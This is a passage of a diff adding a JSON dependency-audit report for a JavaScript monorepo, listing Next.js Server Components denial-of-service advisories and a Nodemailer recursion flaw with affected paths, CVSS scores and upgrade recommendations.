+          "version": "14.2.18",
+          "paths": [
+            "apps/admin > next@14.2.18",
+            "apps/web > next@14.2.18",
+            "packages/frames > frames.js@0.11.4 > next@14.2.18",
+            "packages/frames > next@14.2.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-mwv6-3258-q52c\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55184\n- https://github.com/advisories/GHSA-mwv6-3258-q52c",
+      "created": "2025-12-11T22:49:27.000Z",
+      "id": 1111391,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55184](https://www.cve.org/CVERecord?id=CVE-2025-55184).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that, when deserialized, can cause the server process to hang and consume CPU. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next Vulnerable to Denial of Service with Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.3.0 <14.2.34",
+      "github_advisory_id": "GHSA-mwv6-3258-q52c",
+      "recommendation": "Upgrade to version 14.2.34 or later",
+      "patched_versions": ">=14.2.34",
+      "updated": "2025-12-11T22:49:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-mwv6-3258-q52c"
+    },
+    "1111461": {
+      "findings": [
+        {
+          "version": "14.2.18",
+          "paths": [
+            "apps/admin > next@14.2.18",
+            "apps/web > next@14.2.18",
+            "packages/frames > frames.js@0.11.4 > next@14.2.18",
+            "packages/frames > next@14.2.18"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-5j59-xgg2-r9c4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-67779\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://react.dev/blog/2025/12/11/denial-of-service-and-source-code-exposure-in-react-server-components\n- https://www.cve.org/CVERecord?id=CVE-2025-55184\n- https://www.facebook.com/security/advisories/cve-2025-67779\n- https://github.com/advisories/GHSA-5j59-xgg2-r9c4",
+      "created": "2025-12-12T17:21:57.000Z",
+      "id": 1111461,
+      "npm_advisory_id": null,
+      "overview": "It was found that the fix addressing [CVE-2025-55184](https://github.com/advisories/GHSA-2m3v-v2m8-q956) in React Server Components was incomplete and did not fully prevent denial-of-service attacks in all payload types. This affects React package versions 19.0.2, 19.1.3, and 19.2.2 and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-67779](https://www.cve.org/CVERecord?id=CVE-2025-67779).\n\nA malicious HTTP request can be crafted and sent to any Server Function endpoint that, when deserialized, can enter an infinite loop within the React Server Components runtime. This can cause the server process to hang and consume CPU, resulting in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next has a Denial of Service with Server Components - Incomplete Fix Follow-Up",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.3.1-canary.0 <14.2.35",
+      "github_advisory_id": "GHSA-5j59-xgg2-r9c4",
+      "recommendation": "Upgrade to version 14.2.35 or later",
+      "patched_versions": ">=14.2.35",
+      "updated": "2025-12-12T17:22:00.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j59-xgg2-r9c4"
+    },
+    "1111548": {
+      "findings": [
+        {
+          "version": "6.10.1",
+          "paths": [
+            "apps/admin > @castquest/core-services@link:../../packages/core-services > nodemailer@6.10.1",
+            "packages/core-services > nodemailer@6.10.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-14874\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://access.redhat.com/security/cve/CVE-2025-14874\n- https://bugzilla.redhat.com/show_bug.cgi?id=2418133\n- https://github.com/nodemailer/nodemailer\n- https://github.com/advisories/GHSA-46j5-6fg5-4gv3",
+      "created": "2025-12-18T09:30:30.000Z",
+      "id": 1111548,
+      "npm_advisory_id": null,
+      "overview": "A flaw was found in Nodemailer. This vulnerability allows a denial of service (DoS) via a crafted email address header that triggers infinite recursion in the address parser.",
+      "reported_by": null,
+      "title": "Nodemailer is vulnerable to DoS through Uncontrolled Recursion",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-14874"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<7.0.11",
+      "github_advisory_id": "GHSA-46j5-6fg5-4gv3",
+      "recommendation": "Upgrade to version 7.0.11 or later",
+      "patched_versions": ">=7.0.11",
+      "updated": "2025-12-18T22:43:41.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-674",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-46j5-6fg5-4gv3"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 6,
+      "moderate": 6,
+      "high": 6,
+      "critical": 1
+    },
+    "dependencies": 2311,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 2311
+  }
+}
